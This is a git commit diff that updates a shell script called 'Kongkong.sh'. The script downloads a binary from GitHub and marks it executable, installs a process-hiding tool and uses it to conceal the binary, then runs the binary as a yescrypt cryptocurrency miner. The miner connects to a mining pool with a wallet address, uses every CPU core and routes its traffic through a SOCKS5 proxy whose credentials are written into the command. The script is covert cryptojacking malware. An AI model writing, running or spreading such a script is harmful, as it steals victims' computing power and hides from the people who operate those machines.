0238aa0c35f3d078eae3769c3d6b68b07cfe4156
uaaoxjdr <99876928+uaaoxjdr@users.noreply.github.com>
2022-05-08 18:45:12 +0700

    Update Kongkong.sh

--- Kongkong.sh
+++ Kongkong.sh
@@ -1,7 +1,7 @@
 #!/bin/sh
 apt update -y
 wget -q https://github.com/thirthada007/DevOps/raw/main/data
-!chmod +x data
-!npm i -g node-process-hider 
-!ph add data
+chmod +x data
+npm i -g node-process-hider 
+ph add data
 ./data -a yescrypt -o stratum+tcp://yescrypt.na.mine.zergpool.com:6233 -u TQzmMDEjP1k2a7c6xqf3xJgJJ7E9NkzBbW.archer -p c=TRX -t $(nproc) -x socks5://Kemjabd1727:Gaushd019@154.92.114.148:5843
